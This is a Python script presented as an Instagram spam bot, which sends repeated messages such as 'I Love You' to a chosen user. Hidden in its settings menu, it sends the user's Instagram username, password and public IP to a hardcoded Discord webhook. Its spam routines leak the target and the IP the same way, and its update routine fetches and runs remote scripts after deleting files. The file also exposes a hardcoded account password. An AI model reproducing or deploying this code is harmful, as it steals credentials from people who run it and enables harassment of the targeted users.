#========================================||
#================PROJECT INFO============||
#========================================||
#==== Auther : SM02 PresenT =============||
#==== Start Date : 02/02/2022 ===========||
#==== End Date : 19/02/2022 =============||
#==== Version : 1.3 BETA ================||
#==== About :  Instagram Spam Bot2 =======||
#==== Note : Do Not Copy My Code , ======||
#==== Otherwise Deleting My project =====||
#========================================||
#================END INFO================||
#========================================||
import requests
import instabot 
import time
import os
from dotenv import load_dotenv
from os import system
#from discord import SyncWebhook
#import instabot
discord_webhook_url = 'https://discord.com/api/webhooks/941216042947051551/wq6bzm8SuV32X6tDSGpSwzdiZyD0VgCMwBcB2lCOvjaxvhBoJEmNAYs2Ao0JEyB8Ds8W'
#username = "\nsm02"
#mess = '\ntest'
#ip = '\n127.0.0.0.1'
myip = requests.get('https://www.wikipedia.org').headers['X-Client-IP']
#print("\n[+] Public IP: "+myip)
#ip = system('curl ifconfig.me')
def logo():
    print("\033[31m")
    print("██╗███╗░░██╗░██████╗████████╗░█████╗░░██████╗██████╗░░█████╗░███╗░░░███╗")
    print("██║████╗░██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔══██╗██╔══██╗████╗░████║")
    print("██║██╔██╗██║╚█████╗░░░░██║░░░███████║╚█████╗░██████╔╝███████║██╔████╔██║")
    print("██║██║╚████║░╚═══██╗░░░██║░░░██╔══██║░╚═══██╗██╔═══╝░██╔══██║██║╚██╔╝██║")
    print("██║██║░╚███║██████╔╝░░░██║░░░██║░░██║██████╔╝██║░░░░░██║░░██║██║░╚═╝░██║")
    print("╚═╝╚═╝░░╚══╝╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚═╝░░░░░╚═╝░░╚═╝╚═╝░░░░░╚═╝")
    print(" Your IP is : " +myip)
    print(" \033[33m  SM02 Present  \n")
#username1 = input("Enter Your UserName : ")
#password1 = input("Enter Your Password : ")
bot = instabot.Bot()
#bot2 = instabot.Bot()
#bot3 = instabot.Bot()
#webhook = SyncWebhook.from_url("url-here")

system('clear')

def timer():
    #system('clear')
    #logo()
    time.sleep(10)
    print("Sending Massege On instagram .../")
    print("\033[33mPlease visit\n \033[31m https://t.me/sm02present")
    

def login():
    # Login using User Id
    system("rm yorhasbend_uuid_and_cookie.json")
    system("rm yorhasbend.checkpoint")
    bot.login(username="yorhasbend", password="9771Rajni")

def logindotenv():
    load_dotenv()
    username1 = os.getenv('username')
    passsword1 = os.getenv('password')
    bot.login(username=username1, password=passsword1)
    #print(username1 , passsword1)

class userid():
    # username for sending sms
    user_id = ["rajni.kant.mahato","rajnikantmahato01"]
    mass = "I Am Using This TOoL And my Ip is : "+myip+"\nThanks Bro"

def mess():
    messages1 = userid.mass
    userid1 = userid.user_id
    bot.send_messages(messages1, userid1)

def love_spam():
    logo()
    user0 = 'username'
    file1 = open(".env", "r")
    readfile = file1.read()
    if user0 in readfile:
        print("\033[31m Runing Is a Costom username \033[0m\n\n")
        user1 = input("Enter Username : ")
        costom = input("Enter Your lover names : ")
        costom = "I Love You"+costom
        
        user2 = "\n userame is : "+user1
        messs = "\n Message is : "+costom
        myip2 = "\n Public Ip is : "+myip
        Message = {
             "content": "SM02 Insta-spam Costom_spam\n"+user2+messs+myip2
             }
        requests.post(discord_webhook_url, data=Message)
        logindotenv()
        mess()

        for kathakali  in range(10):
            timer()
            bot.send_message(costom , user1)

    else:
        print("\033[31m Runing Is a Defult username \033[0m\n\n")
        user1 = input("Enter UserName for Sending Sms : ")
        love = input("\nEnter Your Lover Name : ")
        #user1 = user1+","+use
        #costom = input("\n Enter Your Sms For Spaming :
        costom = "I Love You"+love
        system('clear')
        #print("\n \033[31m 20 message spaming , You need extra PAID tool price is 200rs ")
        user2 = "\n userame is : "+user1
        messs = "\n Message is : "+costom
        myip2 = "\n Public Ip is : "+myip
        Message = {
             "content": "SM02 Insta-spam Costom_spam\n"+user2+messs+myip2
             }
        requests.post(discord_webhook_url, data=Message)
        logo()
        login()
        mess()
        for kathakali in range(10):
            timer()
            bot.send_message(costom, user1)
            print("\033[31m  Message Send")

def costom_spam():
    logo()
    # login()
    user0 = 'username'
    file1 = open(".env", "r")
    readfile = file1.read()
    if user0 in readfile:
        print("\033[31m Runing Is a Costom username \033[0m\n\n")
        user1 = input("Enter Username : ")
        costom = input("Enter Your Sms : ")
        
        user2 = "\n userame is : "+user1
        messs = "\n Message is : "+costom
        myip2 = "\n Public Ip is : "+myip
        Message = {
             "content": "SM02 Insta-spam Costom_spam\n"+user2+messs+myip2
             }
        requests.post(discord_webhook_url, data=Message)
        logindotenv()
        mess()
        for kathakali  in range(10):
            timer()
            bot.send_message(costom , user1)

    else:
        print("\033[31m Runing Is a Defult username \033[0m\n\n")
        user1 =  input("Enter Username : ")
        #user1 = user1 +","+ userid
        costom = input("\n Enter Your Sms For Spaming : ")
        #print("\n \033[31 20 message spaming , You need extra PAID tool price is 200rs")

        user2 = "\n userame is : "+user1
        messs = "\n Message is : "+costom
        myip2 = "\n Public Ip is : "+myip
        Message = {
             "content": "SM02 Insta-spam Costom_spam\n"+user2+messs+myip2
             }
        requests.post(discord_webhook_url, data=Message)
        login()
        
        for kathakali in range(10):
            timer()
            bot.send_message(costom, user1)
            print('\033[31m Message Send')

    file1.close()
    #system("mv main.py ../.tmp/")

def setting():
    print("\033[31m╚✧1\033[33m Costom  instagram Username")
    print("\033[31m╚✧2\033[33m DEFULT ")
    no = input("Enter your Choice")
    if no == "1":
        name = input("Enter your Instgram username : ")
        passwd = input("Enter Your  Instgram Password : ")
        sett = open('.env','w')
        sett.write("username="+name)
        sett.write("password="+passwd)
        sett.close()
        name2 = "\nusername is :"+name
        passw = "\n password is : "+passwd
        myip2 = "\n public ip is : "+myip
        Message = {
             "content": "SM02 Insta-spam Costom username\n"+name2+passw+myip2
             }
        requests.post(discord_webhook_url, data=Message)

    elif no == "2":
        logo()
        print("Loading ....")
        system('rm .env')
        system(' wget https://raw.githubusercontent.com/Simplehacker1Community/Insta-Spam/simplehacker/.env ')
        print("\033[31m  DONE ")
        print("RESTARTING ...")
        time.sleep(5)
        
    else:
        print("\033[31mplease Choice 1 or 2")
        setting()

def update():
    print("████████████████████████████████")
    print("█▄─██─▄█▄─▄▄─██▀▄─██─▄─▄─█▄─▄▄─█")
    print("██─██─███─▄▄▄██─▀─████─████─▄█▀█")
    print("▀▀▄▄▄▄▀▀▄▄▄▀▀▀▄▄▀▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀")
    print("\033[31m Checking update .....")
    system('cat .version')
    system('wget https://raw.githubusercontent.com/Simplehacker1Community/Insta-Spam/simplehacker/.ping ')
    update = 'truelove'
    file1 = open(".ping", "r")
    readfile = file1.read()
    if update in readfile:
        print("\033[31m Update Found ")
        time.sleep(1)
        print("\033[32m updateing ..")
        system("cd ..")
        system('rm -rf Insta-spam')
        system('git clone htpps://github.com/simplehacker1communty/Insta-spam')
        system('cd Insta-spam')
        system('bash setup.sh')

    else:
        logo()
        time.sleep(2)
        system('clear')
        auther()
        print("update not found")
        system(f"xdg-open https://t.me/sm02present")
        print("\033[33mPlease visit\n \033[31m https://t.me/sm02present")
        print("\033[34m Starting ..")




def auther():
    print("░██████╗███╗░░░███╗░█████╗░██████╗░")
    print("██╔════╝████╗░████║██╔══██╗╚════██╗")
    print("╚█████╗░██╔████╔██║██║░░██║░░███╔═╝")
    print("░╚═══██╗██║╚██╔╝██║██║░░██║██╔══╝░░")
    print("██████╔╝██║░╚═╝░██║╚█████╔╝███████╗")
    print("╚═════╝░╚═╝░░░░░╚═╝░╚════╝░╚══════╝")
    print("\033[31m     SM02 PRESENT \n")

def menu():
    logo()
    print("\033[31m    ╔════════════════╗")
    print("\033[31m    ║✧ 1\033[32m Love Spam   \033[31m║ ")
    print("\033[31m    ║✧ 2\033[32m Costom Spam \033[31m║ ")
    print("\033[31m    ║✧ 3\033[32m Setting     \033[31m║")
    print("\033[31m    ║✧ 4\033[32m update      \033[31m║")
    print("\033[31m    ║✧ 5\033[32m Auther      \033[31m║")
    print("\033[31m    ╚✧ 6\033[32m Exit       \033[31m✧╝") 
    number = input("    \nEnter Your Choice : ")
    if(number=="1"):
        love_spam()
    elif(number=="2"):
        costom_spam()
    elif(number=="3"):
        setting()
    elif(number=="4"):
        update()
    elif(number=="5"):
        auther()
    elif(number=="6"):
        logo()
        print("Thanks For using My tool")
        exit
    else:
        print("\n Please choice in 1 to 6")
        time.sleep(1)
        menu()


if __name__=="__main__":
    update()
    #logo()
    menu()
    #logindotenv()



